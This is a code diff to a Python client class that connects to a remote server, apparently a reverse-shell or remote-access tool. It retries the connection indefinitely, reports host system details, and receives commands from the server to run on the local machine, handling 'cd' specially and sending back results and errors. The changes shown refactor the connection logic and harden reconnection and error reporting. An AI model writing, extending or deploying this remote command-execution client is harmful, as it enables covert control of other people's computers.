@@ -10,19 +10,7 @@ class Client:
 
         self._socket = socket.socket()
         self.open_socket()
-        self.info_init()
-
         self.receive_loop()
-
-
-    def open_socket(self):
-        self.ADDR = (ipsetter.get_serverip(), 3056)
-        try:
-            self._socket.connect(self.ADDR)
-        except ConnectionRefusedError:
-            time.sleep(1)
-            self.open_socket()
-        
 
 
     def info_init(self):
@@ -39,12 +27,22 @@ class Client:
             f.write(str(platform.system()) + '\n')
         
 
+    def open_socket(self):
+        try:
+            self._socket.connect(ipsetter.get_server_addr())
+            self.info_init()
+        except ConnectionRefusedError:
+            time.sleep(1)
+            self.open_socket()        
+
+
     def transfer(self):
         typ = self._socket.recv(self.SIZE).decode()
 
         if typ == 'command':
             self._socket.sendall('Ready'.encode())
             recv = self._socket.recv(self.SIZE).decode()
+            print(recv)
             if recv[:2] == 'cd':
                 res = os.chdir(recv[3:])
             else:
@@ -97,15 +95,15 @@ class Client:
         try:
             while True:
                 self.transfer()
-        except:
-            self._socket.sendall('Error'.encode())
+        except Exception as ex:
+            self._socket.sendall('Error {}'.format(ex).encode())
         finally:
             self._socket.close()
 
 def main():
     try:
         c = Client()
-    except BrokenPipeError:
+    except (BrokenPipeError, ConnectionResetError):
         main()
 
 if __name__ == '__main__':
